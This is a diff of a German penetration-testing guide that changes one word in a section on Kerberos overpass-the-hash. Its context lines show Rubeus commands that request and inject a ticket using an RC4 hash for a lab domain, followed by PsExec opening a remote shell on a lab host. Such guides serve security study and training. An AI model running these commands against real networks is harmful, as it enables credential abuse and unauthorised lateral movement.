@@ -19,7 +19,7 @@ Für Szenarien, die AES256 erfordern, kann die Option `-aesKey [AES key]` verwen
 
 Aufgetretene Probleme wie _PyAsn1Error_ oder _KDC kann den Namen nicht finden_ werden typischerweise durch ein Update der Impacket-Bibliothek oder durch die Verwendung des Hostnamens anstelle der IP-Adresse gelöst, um die Kompatibilität mit dem Kerberos KDC sicherzustellen.
 
-Eine alternative Befehlssequenz mit Rubeus.exe zeigt einen weiteren Aspekt dieser Technik:
+Eine alternative Befehlssequenz mit Rubeus.exe zeigt eine weitere Facette dieser Technik:
 ```bash
 .\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
 .\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
